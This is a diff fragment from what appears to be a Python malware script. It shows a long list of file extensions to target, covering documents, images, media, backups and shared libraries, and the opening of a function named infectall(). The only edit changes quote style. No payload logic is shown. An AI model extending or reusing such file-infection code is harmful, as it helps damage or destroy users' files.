@@ -40,7 +40,7 @@ ext=['*.txt','*.lnk','*.application','*.veg','*.doc','*.pdf','*.jpg','*.gif','*.
 ,'*.cdr','*.ai','*.tif','*.fla','*.swf','*.dwg','*.mpg','*.xls','*.docx','*.rtf','*.pps','*.ppt'
 ,'*.pptx','*.ppsx','*.ico','*.3gp','*.dxf','*.eps','*.max','*.nrg','*.ogg','*.pic','*.php','*.qxd'
 ,'*.rm','*.swf','*.vob','*.wri','*.vbs','*.chc','*.real','*.list','*.desktop','*.so','*.json','*.new'
-,"*.bkp","*.bak","*.tmp","*.gho","*.mp3"]
+,'*.bkp','*.bak','*.tmp','*.gho','*.mp3']
 sys = platform.system()
 
 def infectall():
